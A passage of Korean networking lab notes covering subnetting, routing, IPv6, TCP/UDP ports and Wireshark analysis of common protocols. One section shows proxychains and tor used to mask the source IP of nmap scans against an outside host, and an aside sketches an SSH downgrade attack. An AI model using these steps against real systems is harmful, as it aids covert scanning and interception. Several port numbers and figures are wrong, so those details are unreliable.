				-> 반드시 "192.168.X.X"만 사용해야 하는가?
					(예) 회사에 사설 아이피를 사용해서 10대의 컴퓨터를 가지고 사설 네트워크를 구축
				-> 회사 네트워크 구축시 물리는 클라이언트의 수는 어떻게 되는가?
  
			5. Network Number / Broadcast Addr. / Netmask
				- Network Number           지정된 네트워크에 첫번째 IP(EX: 172.16.0.0)
				- Broadcast Address        지정된 네트워크에 마지막 IP(EX: 172.16.255.255)
				- Netmask                  네트워크를 구분하는 인자값 (EX: 255.255.0.0)
		
			6. 멀티캐스트 참고
				224.0.0.1 All Systems on this Subnet  -> 나한테 물려있는 모든 호스트 
				224.0.0.2 All Routers on this Subnet  -> 나한테 물려있는 모든 라우터 
			
			7. 서브넷팅과 VLSM
				1.기본
					A Class : 255.0.0.0
					B Class : 255.255.0.0
					C Class : 255.255.255.0
				
				2.서브넷팅 
					구조
						---------------------------------------------
						Supernet    <-    Network    ->    Subnetwork
						Supernetting                       Subnetting
										  Netmask          Subnetmask
						---------------------------------------------
						(EX: CIDR)                         (EX: VLSM)
					용도
						- 관리(성능, 부서별(VLAN), 지역적 위치(VPN), 프로토콜별 등)
						- 보안상(서버대역-사용자대역 분리, 접근 제어 등)
					if C class,
						- Subnet 2 : 255.255.255.128 (256 - 128 = 128)
  						- Subnet 4 : 255.255.255.192 (256 - 192 = 64 )
  						- Subnet 8 : 255.255.255.224 (256 - 224 = 32 )
  						- Subnet 16: 255.255.255.240 (256 - 224 = 16 )
  						- Subnet 32: 255.255.255.248 (256 - 248 = 8  )
  						- Subnet 64: 255.255.255.252 (256 - 252 = 4  )
				
				3.VLSM
					(예제1)
						(조건1) 120개 호스트, 30개 호스트 => 네트워크 2개를 만든다.
						(조건2) C Class : 192.168.1.0/24 => 구성한다.

						(풀이1)		
							192.168.1.0/25 - 120/128
							192.168.1.128/27 - 30/32
						
						(풀이2)
						1) 필요한 호스트 IP 개수 계산 
						2) 해당 호스트 개수를 표현하기 위해 필요한 비트수 계산
							2^x - 2 >= n개
							* n : 필요한 호스트 개수
							* x : 필요한 비트수
							* -2: network number, broadcast address 제외
						3) VLSM 서브넷 마스크 값 계산
						4) 서브넷 별 호스트 ID 범위(사용 가능한 IP 대역) 계산
					
					(예제2)
						(조건1) 60개 호스트, 30개, 12개, 2개 호스트 => 네트워크 4개를 만든다.
						(조건2) C Class : 192.168.1.0/24 => 구성한다.

						(풀이1)
						1) 필요한 호스트 IP 개수 계산 
						2) 해당 호스트 개수를 표현하기 위해 필요한 비트수 계산
							2^x - 2 >= n개
							* n : 필요한 호스트 개수
							* x : 필요한 비트수
							* -2: network number, broadcast address 제외
						3) VLSM 서브넷 마스크 값 계산
						4) 서브넷 별 호스트 ID 범위(사용 가능한 IP 대역) 계산
						
						(풀이2)
							192.168.1.0/26		60대
							192.168.1.64/27		30대
							192.168.1.96/28		12대
							192.168.1.112/30	 2대
			
				[실습] Netmask를 설정/변경 
					(리눅스200)	netstat -nr에서 virsh 지워줘야함
						1. 리눅스 200에서 # which virsh 
						2. # virsh net-destroy default
						3. # virsh net-updefine default
						4. # systemctl restart libvirtd
						5. # ifconfig 하면 없어진것 확인
					(firewall)
						6. # firewall에서
						7. # virsh
						8. # net-destroy default
						9. # net-undefine default
						10.# exit
						11.# systemctl restart libvirtd
						12.# ifconfig 하면 없어진것 확인
					(리눅스200)	
						1. # nm-connection-editor & 에서 마스크 25 하고 게이트웨이 지우기 
						2. # nmcli connection reload
						3. # nmcli connection up eth0
						4. # nslookup www.daum.net 해보기 안됨 
						5. # wireshark &	-> eth0
						6. # ping 192.168.20.100 하면 패킷이 안잡힘 
						7. # ping 192.168.20.201 하면 패킷이 잡힘
							이유는 : 이렇게 하면 네트워크 번호가 192.168.20.128 이고 윈도우는 201 이라서 128이상의 네트워크는 통신이 됨					
					(윈도우)
						1. cmd에서 ipconfig /all 에서 넷마스크 확인
						2. IP를 255.255.255.101로 바꾸기 
					(리눅스200)
						1. ping -c 2 192.168.20.101	->안됨 같은 대역이 아니라서 
						2. netstat -nr 하면 1개가있는데 디폴트게이트웨이가 없어서 안됨 목적지도없고 네트워크도 안맞아서
						3. ping 192.168.20.100	위와 같은 경우 
					(리눅스200)
						1. nm-connection-editor & 에서 아이피102, 마스크 24 게이트웨이 100
						2. nmcli connection up eth0
					(윈도우201)
						1. 아이피 201 마스크 128
						2. ping 192.168.20.102 하면 됨 윈도우는 사용자의 편의성을 위해서 유연함 
						3. ping 192.168.20.100 2번과같은경우로 됨 
					(복원)
						(리눅스200)
							1.# nm-connection-editor &	에서 마스크 24 게이트웨이 192.168.20.100
							2.# nmcli connection reload
							3.# nmcli connection up eth0	
							4.# ifconfig			확인 
						(윈도우)
							1. 마스크 24로 바꾸기
								
			8. Kernel Routing Table 읽혀지는 순서 
				1.순서
					(1st) 목적지 IP
						목적지 호스트(IP) 주소와 일치하는 경로를 찾는다.
					(2nd) 목적지 Network
						목적지 호스트(IP) 주소와 일치하는 경로가 없다면 목적지 네트워크 주소와 일치하는 경로를 찾는다.
					(3rd) default gateway
						일치하는 경로(IP, Network)가 없으면 default gateway(0.0.0.0)로 보낸다.
				
				[실습] 라우팅 테이블 읽혀시는 순서에 대한 실습
					사용시스템 : 리눅스200
						1. netstat -nr	-> 게이트웨이 보기 
						2. nslookup www.daum.net(211.244.82.107)
							(1) www.daum.net(211.244.82.107) -> 자신의 아이피와 동일한가?   
																(127.0.0.1, 192.168.20.200)
							(2) www.daum.net(211.244.82.107) -> 자신의 네트워크와 동일한가? (192.168.20.0)
							(3) www.daum.net(211.244.82.107) -> 211.244.82.107 정보가 라우팅 테이블에 있는가?
							(4) www.daum.net(211.244.82.107) -> 211.244.82.0 정보가 라우팅 테이블에 있는가?
							(5) www.daum.net(211.244.82.107) -> default gateway가 존재하는가?
						3. ping -c 1 www.google.co.kr 해서 아이피 저장해놓기.
						4. systemctl stop NetworkManager		네트워크매니저 멈추기 
						5. route del default gw 192.168.20.100	게이트웨이 지우기 
						6. netstat -nr 로 확인
							이렇게하면 디폴트 게이트웨이가 없어서 통신을 못하고 패킷을 내보내지 않음
						7. 와이어샤크 실행후 ping 3번아이피 쓰면 패킷이 안나가는걸 확인
						8. route add -host 172.217.31.131 gw 192.168.20.100
						9. ping 172.217.31.131 하면 잘됨 이유는 해당 호스트에 게이트웨이가 잇기때문에
						10. route del -host 172.217.31.131 gw 192.168.20.100	지우고
						11. route add -net 172.217.31.0 netmask 255.255.255.0 gw 192.168.20.100
						12. ping 172.217.31.0 하면 네트워크주소가 있기 때문에 통신가능
						13. route add default gw 192.168.20.100	추가
							(현재상태)
							Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
							0.0.0.0         192.168.20.100  0.0.0.0         UG        0 0          0 eth0
							172.217.31.0    192.168.20.100  255.255.255.0   UG        0 0          0 eth0
							192.168.20.0    0.0.0.0         255.255.255.0   U         0 0          0 eth0

						14.	ping -c 2 172.217.31.131 	네트워크 주소로 가는것임 이건
						15. ping -c 2 168.126.63.1		이건 디폴트게이트웨이때문에 나가는것 

			9. IP 우회에 대한 실습
				1.웹 프록시 
					웹 프록시(Web Proxy) 용도? 
						좋은 용도: (ㄱ) 웹성능을 높이기 위해 사용, (ㄴ) 보안 강화를 위해 사용 
						나쁜 용도: (ㄱ) 소스 IP를 숨기기 위해 사용,(ㄴ) 코드 수정/변조를 위해 사용
					왜 proxychains 필요한가?
						일반 web proxy   : 웹 브라우저에서 웹 proxy 지정하여 인터넷을 한다.
						proxychains(TOR) : 웹 브라우저 뿐만 아니라 일반 명령어도 proxy 지정하여 스캐닝 작업을 할 수 있다.
				
				[실습] 칼리에서 tor과 proxychain 설치 후 실습
					1. apt-get update 						apt 레파지토리에서 목록 가져오는것 
					2. dpkg -l | egrep 'tor|proxychain'		목록 보는것	대문자L은 패키지안에 파일목록보는것 
					3. apt-get -y install tor proxychains
					4. systemctl start tor					토르시작
					5. systemctl status tor					토르상태보기
					6. netstat -antp | grep 9050			토르정보보기 
					7. dpkg -L proxychains
					8. dpkg -L tor
					9. 그냥 nmap -sS 192.168.20.200 하면 내가 보내는것이고 proxychains를 앞에 쓰면 출발아이피를 속여 안전하게 가능 
					10.vi /etc/proxychains.conf
						맨밑에 porxylist 에 add와 meanwile 사이에 중간에 거치고 싶은 사이트를 넣으면 됨 위에 보기처럼 
					11.nslookup www.soldesk.com						-> 아이피 확인
					12.nmap -sT -Pn -p 80 211.40.118.45 			아이피쓰고 st는 tcp로 pn는 no ping 으로 icmp 를 표시 x
					13.proxychains nmap -sT -Pn -p 80 211.40.118.4  해보기 됨 대신 여러 서버를 거쳐 속도가 느림
					14.firefox http://www.dnsleaktest.com &			-> 아이피 확인해보기 아이피가 다 동일 마지막에 같은 NAT로 나가서
					15.proxychains firefox http://www.dnsleaktest.com & 	하면 아이피가 달리지는것을 확인 
					16.wget http://ipinfo.io/ip -q					-> 하면 내가보낸 아이피가 다운로드됨
					17.proxychains wget http://ipinfo.io/ip -q		-> 하면 송신주소가 이상한게 잇음
				
				2. Chain의 종류 ( vi /etc/proxychains.conf)
					Strict Chain  : 
						프록시 체인 구성 -> 목록을 만들고 -> 전부다 온라인상태여야하고 -> 그것을 통해서 연결한다.
					Dynamic Chain : 
						연결 요청 -> 프록시에 체인 구성 -> 그 목록을 가지고 연결작업 진행 -> 만약 목록중에 죽은게있으면 건너뛴다. 
					Random Chain  : 
						연결 요청 -> 경로가 계속 바뀜 -> 해당 경로로 요청함 -> 매번 틀려지므로 보안장비 우회에 좋음 
				
				3. 정리 
					# apt-get -y install proxychains libproxychains3 tor
					# service tor restart
					# proxychains CMD 
						
			10. IPv6 	
				1. 특징
					- 주소 확장    -> 많이 사용 가능
					- 헤더 단순화  -> 성능향상
					- 확장헤더	 
					- 옵션 증가 
				
				2. IPv6 헤더 해석
					■ Version(4 bits) 
					● IP 버전, IPv6 경우는 항상 6이다.
			
					■ Traffic Class(1) 
					● (TOS 비슷) 특정 트래픽 클래스의 우선순위를 지정하는데 사용한다.

					■ Flow Label(20 bits) : 
					● 동일한 흐름에 속한 패킷 집합에 레이블을 지정하기 위해 발신지에서 사용된다. 
					● 이 필드는 일반적으로 QoS 관리에 사용되며, 동일한 흐름의 일부의 패킷이 동일한 경로를 사용하는지 확인하기 위해 사용된다.

					■ Payload Length(2) 
					● (Header Length + Toltal Length)IPv6 헤더 다음에 오는 데이터 페이로드의 길이이다.
															
					■ Next Header(1) 
					● (Protocol 비슷) IPv6 헤더를 캡슐화하는 계층 4 헤더를 식별한다.
					
					■ Hop Limit(1) 
					● (TTL 비슷) 라우터를 통해 홉 단위로 측정된 패킷의 수명을 정의한다.
					
					■ Source IP Address(16) 
					● 패킷을 보낸 호스트의 IP 주소이다.
					
					■ Destination IP Address(16) 
					● 패킷을 받을 목적지 호스트의 IP 주소이다.
				
				3. IPv6 Address Type
					-----------------+------------------------------------
					IPv4             |      IPv6
					-----------------+------------------------------------
					Unicast Addr.    |   Unicast Addr.
					Multicast Addr.  |   Multicast Addr.(+ Broadcast Addr.)
					Broadcast Addr.  |   Anycast Addr.
					-----------------+------------------------------------ 				

				4. IPv6 주소 표현 방법 
					(예) fe80:0000:0000:0000:0a00:20ff:feb5:4137
					(예) fe80:0:0:0:0a00:20ff:feb5:4137
					(예) fe80::0a00:20ff:feb5:4137
				
				5. IPv6 Autoconfiguration 
					-----------------+------------------------------------
					IPv4             |      IPv6
					-----------------+------------------------------------
					수동 설정()		 |  Static
					자동 설정(DHCPv4)|  Statefull Autoconfiguration(DHCPv6)
									 |  Stateless Autoconfiguration(새로나온것) 
					-----------------+------------------------------------				
				6. Format Prefixes
					(Prefix)
						|<-----      Prefix(64bits)         ----->|<-----   EUI-64(64bits)   ----->|
						+---------------+-------------------------+--------------------------------+
						|  FE80         |                         | Interface ID      	             |
						+---------------+-------------------------+--------------------------------+
						|  FEC0         |			<-1.물리적으로 연결된 네트워크 안에서만 통신할 때 사용하는 주소(유니캐스트)	
						|  FEC0         |			<-2.인트라넷(Intranet)안에서만 통신할 때 사용하는 주소(유니캐스트)	
						|  2 or 3       |			<-3.인터넷상에서 통신할 때 사용하는 주소(유니캐스트)
						|  FF           |			<-4.멀티캐스트				
						
						1. (a). Link-Local Unicast Address Types
							10 bits           54 bits                       64 bits
						+---------------+-------------------------+--------------------------------+
						| 1111111010    | All Zeros(0)            | Interface ID                   |
						+---------------+-------------------------+--------------------------------+
						(예) fe80::0a00:20ff:feb5:4137 
						
						2. (b). Site-Local Unicast Address Types
							10 bits           38 bits      16 bits           64 bits
						+---------------+--------------+-----------+--------------------------------+
						| 1111111011    | All Zeros(0) | Subnet ID | Interface ID                   |
						+---------------+--------------+-----------+--------------------------------+
						(예) fec0::0003:a00:20ff:feb5:4137
						
						3. (c). Aggregatable Global Unicast Address Types
						3 bits 13 bits        32 bits     16 bits           64 bits
						+-----+----------+--------------+-----------+--------------------------------+
						| 001 | TLA      | NLA          | SLA       | Interface ID           	      |
						+-----+----------+--------------+-----------+--------------------------------+
						예)     한국       KT             DAUM
				
				7. IPv4 와 IPv6 패킷 분석
					환경 :
						호스트A		  --------HTTP Request---------> 호스트B (웹서버)
						*172.16.16.140<-------HTTP Response--------- *172.16.16.139
						
						호스트A		       --------HTTP Request---------> 호스트B (웹서버)
						*2001:db8:1:2::1002<-------HTTP Response--------- *2001:db8:1:2::1000
			
				8. IPv6 패킷구조
					- ipv6는 브로드캐스트가없다.
					- 따라서 arp를 통해 상대편 mac모름 대신에 NDP 프로토콜 사용 
						NDP : neighbor discovery protocol
					1. 처음으로 옆에 있는 서버에 멀티캐스트함(FF로시작) 이후 MAC받음 
						Neighbor Solicitation  : ICMP Type 135		처음에 이걸 보냄 자기 IP와 MAC추가해서 멀티캐스트
						Neighbor Advertisement : ICMP Type 136		필요한 IP에 대한 MAC를 보낸다 
				
				9. IPv6 단편화
					환경 : A----------R1------R2------>WebServer
						MTU1500 	MTU1500	 MTU1400	MTU1500
					IPv4는 R2에서 문제가 생겨서 통신을 못함.
					IPv6는 경로의 MTU를 확인해서 문제가 생기지 않도록함 위의 경우 1400으로 정해서 보냄 
				
				10. IPv6 동작 원리 
					1. IP 자동 설정 과정(IP Autoconfiguration(Stateless Autoconfiguration))
					2. 라우터에서 Prefix 변경(Router Prefix Modification)	변경되면 붙어있는 모든 장비에 뿌림
					3. IP 중첩 점검(IP Duplecated Address Detection)		중첩을 확인
					
					(동작) IP Autoconfiguration(Stateless Autoconfiguration)
						---------+---------------+-------------- Router
								 |               |               - prefix1 (FEC0::9255/64)
							   ClientA         ClientB           - prefix2 (2::9255/64)
						
						① (ClientA) 부팅
						② (ClientA) EUI-64 생성
							08:00:20:b5:41:37(48bits) + ? = 0a00:20ff:feb5:4137
						③ (ClientA) Link-Local Unicast 주소 생성
							fe80::0a00:20ff:feb5:4137
						④ (ClientA) prefix 요청
						⑤ (router) prefix 제공
							fec0::9255:
							2::9255:
						⑥ (ClientA) Site-Local/Global Unicast 주소 생성
							fec0::9255:0a00:20ff:feb5:4137
							2::9255:0a00:20ff:feb5:4137

						(결론)
						● ClientA는 부팅이 되고 나면 3개의 IPv6 주소가 추가적으로 설정된다.
						● 만약, IPv6 Router가 존재하지 않는다면, ClientA는 Link-Local Unicast 주소만 생성이 된다.
				
					(동작) Router Prefix Modification
						---------+---------------+-------------- Router
								 |               |               Prefix1 -> Prefix2 (FEC0::9255 -> FEC0::9266)
							  ClientA         ClientB
						① (Router) prefix 변경(prefix1 -> prefix2)
							fec0::9255: -- 변경 --> fec0::9266
						② (Router) 변경된 사용을 배포
							fec0::9266:
						③ (ClientA/ClientB)
							(Old) fec0::9255:0a00:20ff:feb5:4137
							(New) fec0::9266:0a00:20ff:feb5:4137	이렇게 ip가 2개가 생김 이유는 기존에 통신하는것을 끊게하지 않으려고
						
						(결론)
						● IPv6 Router에서 prefix 값을 변경하면, 모든 호스트(ClientA/ClientB)에 반영된다.
				
					(동작) IP Duplecated Address Detection -> NDP 사용 
						---------+---------------+-------------- Router
								 |               |
							   ClientA         ClientB
							   in.ndpd         in.ndpd
							   - IP1           - ? => IP1 or IP2
						① (ClientB) 부팅
						② (ClientB) EUI-64 만들고 Link-Local Unicast 주소 생성
						③ (ClientB) 사용할 수 있는 IP 인지를 확인하는 절차
							ARP 요청/응답과 비슷한 절차 사용
							- if 응답 0 : IP 충돌이 발생함.
							- if 응답 X : IP 충돌이 발생 하지 않음.
						④ (ClientB) if 응답 X --> IP 설정 절차를 진행   
						
						(결론)
						● ClientB는 IPv6 주소를 설정하기 전에 주소의 충돌 여부를 확인하고 설정한다.
						● IPv6에서의 IP 충돌은 곧, MAC 주소 충돌을 의미한다.
					
					(실습) IPv6 대한 실습
						(윈도우2008)
							1. 윈도우 2008 에서 IPv6 사용하기 
							2. ipconfig 하기 
								fe80::4916:ddbe:a2d5:706d%11
							3. 윈도우 2008 에서 주소 직접 설정 
								fe80::11:11:11:11
								64
							4. ipconfig 하기 (두개가 나옴 하나는 기존에 통신하던걸 끊기게 하지 않기 위해)
								fe80::11:11:11:11%11
								fe80::4916:ddbe:a2d5:706d%11
						(리눅스200)
							1. 와이어샤크 실행
							2. ifconfig 실행
								fe80::20c:29ff:fee9:84bf
							3. ping6 -I eth0 -c4 fe80::11:11:11:11		I는 인터페이스 이름 ping6 는 ipv6로 핑하는것
								통신이 됨 
						(복원)
							윈도우 2008복원
							ipv6자동으로 받기 해제 
			
5. 전송계층		
	1. TCP
		TCP 프로토콜의 특징 
			연결형 기반 서비스(Connection Oriented Protocol)
			상태 기반 서비스(Statefull Protocol)
			신뢰 기반 서비스(Reliable Protocol)
	2. UDP
		UDP 프로토콜의 특징 
			비연결형 서비스(Connectionless Protocol)
			비상태 서비스(Stateless Protocol)
			비신뢰 서비스(Unreliable Protocol)
	
	3 헤더 분석 
		(TCP Header)	-> ping 192.168.20.200
			발신지 포트(Source Port, 16 bits)
			목적지 포트(Destnation Port, 16 bits)
			순차 번호(Sequence Number)
			응답 확인 번호(Acknowledgement number, 32 bits)
			헤더 길이(Header Length, 4 bits)
			TCP 제어 플래그(TCP Control Flag, 6 bits)
				● URN : 긴급 플래그(Urgent pointer)
				● ACK : 응답(Acknowledgement)
				● PSH : Push 플래그
				● RST : Reset 플래그
				● RST : Reset 플래그
				● FIN : Finish 플래그
			윈도우 크기(Window size, 16 bits)
			검사합(Checksum, 16 bits)
			긴급포인터(Urgent Pointer, 16 bits)
			옵션(Options)
			
		(UDP Header)	-> nslookup www.daum.net		(ip.addr==168.126.63.1 && ip.addr ==192.168.20.200)
			발신 포트(Source Port, 16 bits)
			수신 포트(Destnation Port, 16 bits)
			패킷 전체 길이(Packet Total Length, 16bits)
			검사합(Checksum, 16 bits)
			
	4. 포트 번호
		1. 헤더별 주소
			Ethernet header  => MAC Address	(48bit,6byte)
			Internet header  => IP Address	(32bit, 4byte)
			Transport header => PORT Address(16bit, 2byte)
		
		2. 번호체계 
			■ The Well-Known Ports                 0     - 1023
			■ The Registered Ports                 1024  - 49151
			■ The Dynamic and/or Private Ports.    49152 - 65535
		
		3. 포트번호 확인
			# netstat -an | more
		
		4. 대표 서비스 포트
			FTP data port(active mode)		TCP/20
			FTP control port				TCP/21
			SSH								TCP/22
			SCP(uses SSH)					TCP/22
			SFTP(uses SSH)					TCP/22
			telnet							TCP/23
			SMTP							TCP/25
			DNS name queries				UDP/53
			DNS zone Transfers				TCP/53
			TFTP							UDP/69
			HTTP							TCP/80
			POP3							TCP/110
			NetBIOS name service			TCP/137
			NetBIOS datagram service		TCP/138
			NetBIOS session service			TCP/139
			IMAP4							TCP/143
			Remote Desktop Protocol(RDP)	TCP/UDP3389
			MySQL							TCP/3306
			MS-SQL 							TCP 1443
			Oracle							TCP 1521
			PostgreSQL						TCP 5432
			MariaDB							TCP 3306
			
		5. 포트번호 실습 
			(윈2008 <- 리눅스200)
				1. # yum -y install nmap nmap-frontend
				2. telnet 192.168.20.201 23
				3. # netstat -antp 			: telnet이 established 된것 확인
				4. # exit					: telnet이 listen 상태 확인 
		
			(윈2008 <- 리눅스200)
				1. nmap 192.168.20.201 		: 윈2008 열린 서버 확인
				2. ftp 192.168.20.201 21 
				3. # netstat -antp 			: ftp가 established 된것 확인 
				4. # exit
				5. # netstat -antp			: 확인후 listen 상태로 된 것 확인 
		
		6. 포트 열어 달라고 요청!
			요청종류
				(서버에서) 요청: FTP 서비스 포트를 열어 달라!!!!
							  -> FTP 서비스 enable 
				(네트워크 장비:라우터/스위치/방화벽) 요청: FTP 서비스 포트를 열어 달라!!!!
														-> FTP 서비스 접근 제어(ACL) Open
			[실습]
				(리눅스 200)
					1. # netstat -antp | grep 21	열려잇음
					2. # systemctl stop vsftpd		닫음
					3. # nmap -p 21 localhost		close됨
		
		7. 자신의 서버에 열린 포트 점검
			[실습]
				(리눅스 200)
					1. # cat /etc/services
				(nmap사용)
					1. # nmap localhost
				(윈도우2008)
					1. C:\Windows\system32\drivers\etc\services 에있음
				(윈도우2008)
					포트스캐닝 툴 설치
					1. nmap.org에서 설치!
					2. advanced port scanner download 설치!
		
		8. 안되는 포트에 요청
			[실습] 
				(윈도우 2008) 
					1. services.msc 에서 world wide web publishing 기능 끄기
				(리눅스 200)
					1. 와이어 샤크 실행
					2. #nmap 192.168.20.201 -p 80 
					3. 필터링후 sys 이후에 rst,ack가 돌아온것 확인 
					
	5. 대표적인 서비스 패킷 분석
		[실습] telnet 패킷 분석 (윈도우2008 -> 리눅스200)
			1. 윈도우에서 telnet 192.168.20.200 해서 들어가는거 랑 나오는거 패킷 잡기
			2. 패킷 분석 시작!
		
		[실습] ftp 패킷 분석 (윈도우2008 -> 리눅스200)
			(리눅스200)
				1. # systemctl restart vsftpd
				2. # systemctl enable vsftpd
				3. # ftp localhost 					해보고 나오기 
			
			(윈도우2008)
				1. 파일 생성 C -> test -> 1111
				2. 와이어샤크 실행
				3. ftp 192.168.20.200 
				4. >cd /root
				5. >lcd c:\test
				6. >bin
				7. >hash
				8. >prompt
				9. >mput 1111*
				10.>quit
				11.c:\exit
				12.패킷분석!!
				[결과]
					21번 포트와 1024이상 포트와 통신하다데이터 통신(mput)이 일어나면 
					액티브모드라 20번포트에 관한 3핸드쉐이크가 일어나 데이터 전송후 4핸드쉐이크로 세션 종료를 따로한다
			
			(액티브vs패시브)
				1. 액티브 -> 기본적으로 21번포트와 1024 포트와 세션을 만들고 20번을통해 데이터 통신후 해당 20번포트는 데이터 통신후 종료 한다.
				2. 패시브 -> 기본적으로 21번포트와 1024 포트와 세션을 만들고 1024이상 포트를 통해 데이터동신을 하는데 할때마다 새로운 포트를 할당 받는다.

		[실습] WEB 패킷 분석 (윈도우2008 -> 리눅스200)
			(HTTP)
				(리눅스)
					1. # systemctl restart httpd		포트 열기
					2. # curl -k http://localhost		홈페이지 보기
					3. # vi /var/www/html/index.html	파일 편집하기 홈페이지 만들려고하는것
				(윈도우2008)
					1. 와이어샤크 실행
					2. 인터넷익스플로어 주소창에 http://192.168.20.200 입력 
					3. 잡힌 패킷 분석 
			
			(HTTPS,TSL,SSL)
				(윈도우2008)
					1. 와이어샤크 실행
					2. 인터넷익스플로어 주소창에 https://192.168.20.200 입력 
					3. 계속탐색 -> 주소옆에 인증서 오류 보기
					4. https는 stateless로 연결후 전송하고 연결 종료가 반복된는것 확인
					5. 그중 TLS(운영체제와 프로그램 사이의 암호화!)
						1. Client Hello		-> 클라이언트가 서버에게 인사 
						2. Server Hello		-> 서버가 클라이언트한테 인사하고, 인증서 보냄
						3. 클라 -> 서버		-> 클라이언트의 (key exchange, change cipher spec, encrypted handshake message) 보냄 
						4. 서버 -> 클라		-> 서버의 (chnage cipher spec, encrypted handshake message) 정의함 
					6. TLS는 follow -> TLS stream 으로 안보임 이유는 인증서?
			
		[실습] Wireshark SSL Decryption(윈도우2008)
			(참고) 패킷을 다운받아야함 실습폴더 밑에 있음
				1. rsasnakeoil2.cap 실행
				2. edit -> preferences -> protocol -> SSL또는TLS 선택 -> RSA keys list 편집 -> 플러스 ->
					127.0.0.1	443	 http	키파일은 받은거 선택 -> 확인
		
		[실습] Smaba 패킷 분석 - 인증서 축출하기 
			실습 시나리오
				1. 칼리서버에서samba을 이용하여 /share 디렉토리를 공유하기
				2. 윈도우2008서버에서 공유디렉토리에 접근하는 패킷 분석
				3. 적당한 파일(sample.pcap)을 공유디렉토리(/share) 전송한다.
				4. 분석된 패킷 내용 중 전송된 파일(sample.pcap) 파일을 축출하고
				5. 축출된 파일의 내용중 서버 인증서를 축출해 보자.
			(칼리)
				1. mkdir -p -m 777 /share
				2. vi /etc/samba/smb.conf
					마지막에 이거 추가 공유시키는것 
					[share]
						comment = Kali Linux Shared Directory
						path = /share
						browseable = yes
						read only = no
						writable = yes
						public = yes
				3. systemctl restart smbd		smbd 재기동
				4. smbclient -L localhost -N
					공유된 정보확인 share있는지 확인
				5. 와이어샤크 실행 -> eth1 번잡기 내부망이라서
			(윈도우2008)
				6. <CTRL + ESC> => \\192.168.20.50\share 하고 위에서 다운받은 sample.pcap 올리기
			(칼리)
				7. cd /share
				8. ls		있는지 확인
				9. 패킷분석
					1. !arp && !ssdp && smb2 필터링 이걸로
					2. write request 에 중요한 정보가있음SMB는 
					3. CTRL+F 로 이름을 sample.pcap후 해당 들어있는것 마킹 ctrl+M
					4. write 에서 데이터부분 우클릭 -> export packet byte -> /root/sample2.pcap저장 
				10. cd
				11. wireshark sample2.pcap &
				12. md5sum sample2.pcap /share/sample.pcap		이 두개가 같은 파일인지 확인하는 것 
				13. 이제 인증서를 추출할차례
				14. 8번패킷보면 서버에서 클라한테 인증서를 준 패킷이 있다
				15. 자세한 상황에서 TLS -> Handshake Protocol : Certificate -> Certificates -> 3개의 인증서중 맨위에꺼 선택 
				16. 우클릭후 export packey byte -> /root/privatekey 로 저장
				17. file * 하면 데이터인걸 알 수 있음
				18. # openssl x509 -inform der -in privatekey -text						18번부터 20까지하면 복원이됨 privatekey가 
						-> 인증서를 DER 포맷으로 내용 확인하기
				19. # openssl x509 -inform der -in privatekey -outform pem -out cert.crt
						-> 인증서를 PEM 포맷으로 변환하기
				20. # openssl x509 -inform pem -in cert.crt -text
						-> 변환된 PEM 포맷의 인증서 내용 확인하기
		
		[실습] ssh 패킷 분석 (윈도우2008 -> 리눅스200)=========================================>과제
			사용시스템 : linux200, win2008
			시나리오 :
				win2008(putty) --> linux200(sshd(22))
				평문형태와 암호화된 형태의 패킷의 차이점에 대해 분석한다.
			
			(윈도우2008)
				1. putty 설치
				2. 호스트이름 192.168.20.200 에 22번 포트 
				3. 와이어샤크 실행 후 2번 하기
				4. 아이디 비번 ls exit 하기
				5. 분석
					1. SSHv2 만 확인! 
					2. 200번 ssh server로 바꾸기 
					3. 패킷을 확인한다 
						key exchange init 으로 서로 뭘로 교환할건지 확인
							-> 이후 하나 결정
						결정한것으로 새로운 키 생성
						데이터전송!
				[참고] SSH 2.0 버전 이하로 실습해야함 2는 해킹이 안됨 1.5까지만 가능
					SSH2.0 버전은 ARP 스푸핑을 이용해 클라이언트가 SSH2.0 으로 통신을 요청하면 
					중간에서 1.5버전으로 바꿔서 서버에 전송 서버는 여려가지를 지원하기때문에 1.5버전으로 하자고해서 공격
					
					이러한 암호화된 SSH2.0버전은 복호화는 할 수 없고 전문가만 가능하다 => 이유는 서버와 클라이언트사이에 키를 교환하고 메모리에있는 키를 가지고 통신하는데 이 메모리를 뒤져서 키를 가져와서 해킹
					공격하는 방법은 위의 방법처럼 다운그레이드 공격 
		
		[실습] Public Key/Private Key 암/복호화 과정 실습
			사용시스템: Kali
			(실습시나리오)
				public key를 사용하여 암호화 하고 private key를 사용하여 복호화하는 과정을 이해한다.

			[실습]
				(칼리) RSA private Key 생성
					# cd
					# openssl genrsa - out private.pem 2048
				
				(칼리) RSA public Key 생성
					# openssl rsa -in private.pem -out pubic.pem -outform PEM -pubout
					# cat public.pem
				
				(칼리) 암호화 시킬 테스트 파일 생성
					# cat << EOF >> sample.sql
					CREATE TABLE [Departments] (
						[DepartmentId] INTEGER NOT NULL PRIMARY KEY,
						[DepartmentName] NVARCHAR(50) NULL
					);
					INSERT INTO Departments VAULES(1, 'IT');
					EOF
				
				(칼리) public key를 사용한 암호화 된 파일 생성(sample.sql -- encrypt --> sample.ssl)
					# openssl rsautl -encrypt -inkey public.pem -pubin -in sample.sql -out sample.ssl
					# cat sample.ssl
					# file sample.ssl		data형식으로 되어있는것 확인
			
				(칼리) private key를 사용한 파일 복호화(sample.ssl -- decrypt --> sample.txt)
					# openssl rsautl -decrypt -inkey private.pem -in sample.ssl -out sample.txt
					# cat sample.txt
			
			[참고] ssh-keygen CMD 와 openssl genrsa CMD 차이점
				# ssh-keygen -t rsa
					-> 개인키 생성 : 복호화 
					-> 공개키 생성 : 암호화
					# ssh-copy-id -i publickey root@192.168.20.200	공개키 보내기 
				
				# openssl genrsa CMD
					-> 개인키 생성 : 복호화
					# openssl rsa .....
				# openssl rsa CMD
					-> 공개키 생성 : 암호화 
					# openssl resutl -encrypt ....
					# openssl resutl -decrypt ....
		
		[실습] Public Key Authentication
			사용시스템 : 리눅스200, 칼리
			(실습시나리오)
				일반적인 SSH 연결과 Public Key Authentication 방식을 사용한 방식의 차이점을 
				패킷 분석을 통해 이해해 보자.
			
			[실습] 일반 SSH 로그인 방식
				(리눅스200)
					1. # cd ~/.ssh
					2. # ls
					3. # rm -f *
				(칼리)
					4. # cd ~/.ssh
					5. # ls
					6. # rm -f *
				(리눅스200)
					7. # ssh root@192.168.20.50
					8. # hostname 
					9. # id
					10.# pwd
					11.# exit
					12.# ls
					13.# cat known_host		-> 칼리리눅스의 공개키임 
				(칼리)
					14.# cat /etc/ssh/ssh_host_ecdsa_key.pub	위랑 같은지 확인
